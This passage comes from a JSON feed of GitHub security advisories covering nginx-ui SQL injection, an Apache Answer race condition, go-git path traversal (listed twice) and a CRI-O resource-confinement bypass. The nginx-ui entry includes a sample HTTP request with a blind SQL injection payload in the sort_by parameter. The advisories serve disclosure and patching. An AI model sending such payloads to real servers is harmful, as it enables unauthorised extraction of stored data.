cosy.Core[model.DnsCredential](c).SetFussy(\"provider\").PagingList()\n}\n</code></pre>\n<p>The <code>PagingList</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func (c *Ctx[T]) PagingList() {\n    data, ok := c.PagingListData()\n    if ok {\n        c.ctx.JSON(http.StatusOK, data)\n    }\n}\n</code></pre>\n<p>And the <code>PagingListData</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func (c *Ctx[T]) PagingListData() (*model.DataList, bool) {\n    result, ok := c.result()\n    if !ok {\n        return nil, false\n    }\n\n    result = result.Scopes(c.OrderAndPaginate())\n    ...\n}\n</code></pre>\n<p>Using the following request, an attacker can retrieve arbitrary values by checking the order used by the query. That is, the result of the comparison will make the response to be ordered in a specific way.</p>\n<pre><code class=\"language-http\">GET /api/dns_credentials?sort_by=(CASE+WHEN+(SELECT+1)=1+THEN+id+ELSE+updated_at+END)+ASC+--+ HTTP/1.1\nHost: 127.0.0.1:8080\nAuthorization: &lt;&lt;JWT TOKEN&gt;\n</code></pre>\n<p>You can notice the order change by changing <code>=1</code> to <code>=2</code>, and so the comparison will return <code>false</code> and the order will be <code>updated_at</code> instead of <code>id</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to <code>Information Disclosure</code></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h374-mm57-879c\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h374-mm57-879c</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/ec93ab05a3ecbb6bcf464d9dca48d74452df8a5b\">https://github.com/0xJacky/nginx-ui/commit/ec93ab05a3ecbb6bcf464d9dca48d74452df8a5b</a></li>\n<li><a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L278-L287\">https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L278-L287</a></li>\n<li><a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L91\">https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L91</a></li>\n<li><a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L99C4\">https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L99C4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22196\">https://nvd.nist.gov/vuln/detail/CVE-2024-22196</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h374-mm57-879c\">https://github.com/advisories/GHSA-h374-mm57-879c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h374-mm57-879c",
            "title": "[github.com/0xJacky/Nginx-UI] Authenticated (user role) SQL injection in `OrderAndPaginate` (GHSL-2023-270)",
            "date_modified": "2024-01-11T21:43:09.000Z",
            "date_published": "2024-01-11T16:27:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h374-mm57-879c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') vulnerability in Apache Answer.</p>\n<p>This issue affects Apache Answer: through 1.2.0.</p>\n<p>Under normal circumstances, a user can only bookmark a question once, and will only increase the number of questions bookmarked once. However, repeat submissions through the script can increase the number of collection of the question many times.</p>\n<p>Users are recommended to upgrade to version [1.2.1], which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49619\">https://nvd.nist.gov/vuln/detail/CVE-2023-49619</a></li>\n<li><a href=\"https://lists.apache.org/thread/nscrl3c7pn68q4j73y3ottql6n5x3hd4\">https://lists.apache.org/thread/nscrl3c7pn68q4j73y3ottql6n5x3hd4</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/10/1\">http://www.openwall.com/lists/oss-security/2024/01/10/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f899-4mr4-fqpv\">https://github.com/advisories/GHSA-f899-4mr4-fqpv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f899-4mr4-fqpv",
            "title": "[github.com/apache/incubator-answer] Apache Answer Race Condition vulnerability",
            "date_modified": "2024-01-19T19:42:23.000Z",
            "date_published": "2024-01-10T09:30:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f899-4mr4-fqpv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A path traversal vulnerability was discovered in go-git versions prior to <code>v5.11</code>. This vulnerability allows an attacker to create and amend files across the filesystem. In the worse case scenario, remote code execution could be achieved.</p>\n<p>Applications are only affected if they are using the <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#ChrootOS\">ChrootOS</a>, which is the default when using \"Plain\" versions of Open and Clone funcs (e.g. PlainClone). Applications using <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#BoundOS\">BoundOS</a> or in-memory filesystems are not affected by this issue.\nThis is a <code>go-git</code> implementation issue and does not affect the upstream <code>git</code> cli.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users running versions of <code>go-git</code> from <code>v4</code> and above are recommended to upgrade to <code>v5.11</code> in order to mitigate this vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>In cases where a bump to the latest version of <code>go-git</code> is not possible in a timely manner, we recommend limiting its use to only trust-worthy Git servers.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thanks to Ionut Lalu for responsibly disclosing this vulnerability to us.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88\">https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49569\">https://nvd.nist.gov/vuln/detail/CVE-2023-49569</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-449p-3h89-pw88\">https://github.com/advisories/GHSA-449p-3h89-pw88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-449p-3h89-pw88",
            "title": "[github.com/go-git/go-git/v5] Maliciously crafted Git server replies can lead to path traversal and RCE on go-git clients",
            "date_modified": "2024-01-12T16:32:44.000Z",
            "date_published": "2024-01-10T15:37:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-449p-3h89-pw88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A path traversal vulnerability was discovered in go-git versions prior to <code>v5.11</code>. This vulnerability allows an attacker to create and amend files across the filesystem. In the worse case scenario, remote code execution could be achieved.</p>\n<p>Applications are only affected if they are using the <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#ChrootOS\">ChrootOS</a>, which is the default when using \"Plain\" versions of Open and Clone funcs (e.g. PlainClone). Applications using <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#BoundOS\">BoundOS</a> or in-memory filesystems are not affected by this issue.\nThis is a <code>go-git</code> implementation issue and does not affect the upstream <code>git</code> cli.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users running versions of <code>go-git</code> from <code>v4</code> and above are recommended to upgrade to <code>v5.11</code> in order to mitigate this vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>In cases where a bump to the latest version of <code>go-git</code> is not possible in a timely manner, we recommend limiting its use to only trust-worthy Git servers.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thanks to Ionut Lalu for responsibly disclosing this vulnerability to us.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88\">https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49569\">https://nvd.nist.gov/vuln/detail/CVE-2023-49569</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-449p-3h89-pw88\">https://github.com/advisories/GHSA-449p-3h89-pw88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-449p-3h89-pw88",
            "title": "[github.com/go-git/go-git/v4] Maliciously crafted Git server replies can lead to path traversal and RCE on go-git clients",
            "date_modified": "2024-01-12T16:32:44.000Z",
            "date_published": "2024-01-10T15:37:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-449p-3h89-pw88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nAll versions of CRI-O running on cgroupv2 nodes. \nUnchecked access to an experimental annotation allows a container to be unconfined. Back in 2021, <a href=\"https://github.com/cri-o/cri-o/pull/4479\">support was added</a> to support an experimental annotation that allows a user to request special resources in cgroupv2. It was supposed to be gated by an experimental annotation: <code>io.kubernetes.cri-o.UnifiedCgroup</code>, which was supposed to be filtered from the <a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">list of allowed annotations</a> . However, there is a bug in this code which allows any user to specify this annotation, regardless of whether it's enabled on the node. The consequences of this are a pod can specify any amount of memory/cpu and get it, circumventing the kubernetes scheduler, and potentially be able to DOS a node. </p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em>\n1.29.1, 1.28.3, 1.27.3</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\nuse cgroupv1</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6476\">https://nvd.nist.gov/vuln/detail/CVE-2023-6476</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/pull/4479\">https://github.com/cri-o/cri-o/pull/4479</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e\">https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-6476\">https://access.redhat.com/security/cve/CVE-2023-6476</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2253994\">https://bugzilla.redhat.com/show_bug.cgi?id=2253994</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:0195\">https://access.redhat.com/errata/RHSA-2024:0195</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:0207\">https://access.redhat.com/errata/RHSA-2024:0207</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc",
            "title": "[github.com/cri-o/cri-o] CRI-O's pods can break out of resource confinement on cgroupv2",
            "date_modified": "2024-01-19T19:46:28.000Z",
            "date_published": "2024-01-10T15:27:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}